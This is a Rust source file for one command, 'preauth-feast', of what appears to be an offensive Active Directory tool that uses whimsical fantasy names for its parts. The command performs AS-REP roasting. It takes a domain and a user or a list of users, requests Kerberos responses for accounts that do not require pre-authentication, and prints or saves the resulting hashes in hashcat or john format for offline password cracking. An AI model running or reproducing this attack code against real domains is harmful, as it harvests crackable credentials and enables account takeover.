use anyhow::{bail, Result};
use std::collections::HashMap;

use crate::dungeon::cauldron::{asrep_roast, HashFormat};
use crate::dungeon::display_charm::*;
use crate::dungeon::krb_structures::constants::*;

pub struct PreauthFeast;

impl super::Spell for PreauthFeast {
    fn incantation(&self) -> &'static str { "preauth-feast" }
    fn grimoire(&self) -> &'static str {
        "AS-REP roast accounts that don't require pre-auth. /user: or /users: /domain: [/dc:] [/aes] [/format:hashcat|john] [/outfile:]"
    }

    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        let domain = args.get("domain").ok_or_else(|| anyhow::anyhow!("/domain: required"))?;
        let dc = args.get("dc").map(|s| s.as_str());
        let etype = if args.contains_key("aes") { ETYPE_AES256_CTS_HMAC_SHA1_96 } else { ETYPE_RC4_HMAC };
        let fmt = match args.get("format").map(|s| s.as_str()) {
            Some("john") => HashFormat::John,
            _ => HashFormat::Hashcat,
        };

        let users: Vec<String> = if let Some(u) = args.get("user") {
            vec![u.clone()]
        } else if let Some(list) = args.get("users") {
            let contents = std::fs::read_to_string(list)?;
            contents.lines().map(|l| l.trim().to_owned()).filter(|l| !l.is_empty()).collect()
        } else {
            bail!("/user: or /users: required")
        };

        let mut file_out: Option<std::fs::File> = args.get("outfile").map(|p| {
            std::fs::OpenOptions::new().append(true).create(true).open(p).unwrap()
        });

        for user in &users {
            match asrep_roast(user, domain, etype, dc, fmt) {
                Ok(roasted) => {
                    print_success(&format!("Roasted: {}@{} (etype {})", user, domain, roasted.etype));
                    println!("{}", roasted.hash);
                    if let Some(ref mut f) = file_out {
                        use std::io::Write;
                        writeln!(f, "{}", roasted.hash).ok();
                    }
                }
                Err(e) => print_warning(&format!("{}: {}", user, e)),
            }
        }
        Ok(())
    }
}
